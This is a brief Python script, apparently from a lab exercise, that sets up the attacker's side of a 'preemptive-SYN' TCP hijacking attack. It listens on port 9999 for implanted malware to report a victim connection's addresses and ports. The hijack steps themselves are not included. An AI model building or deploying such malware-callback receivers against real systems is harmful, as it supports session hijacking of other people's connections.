#!/usr/bin/env python3
import socket

LISTEN_PORT = 9999

def main():
    print("=" * 50)
    print("  PREEMPTIVE-SYN HIJACKING ATTACK")
    print("  Attacker: 30.0.0.30")
    print("=" * 50)
    print()
    print("[*] Step 1: Waiting for victim to connect...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", LISTEN_PORT))
    sock.listen(1)
    print(f"[*] Listening on {LISTEN_PORT}/TCP...")

    conn, addr = sock.accept()
    data = conn.recv(1024).decode()
    conn.close()
    sock.close()

    parts = data.split(':')
    print(f"\n[+] Step 2: Connection received from malware!")
    print(f"    Client: {parts[0]}:{parts[1]}")
    print(f"    Server: {parts[2]}:{parts[3]}")
    print("\n[+] Attack can proceed!")

if __name__ == "__main__":
    main()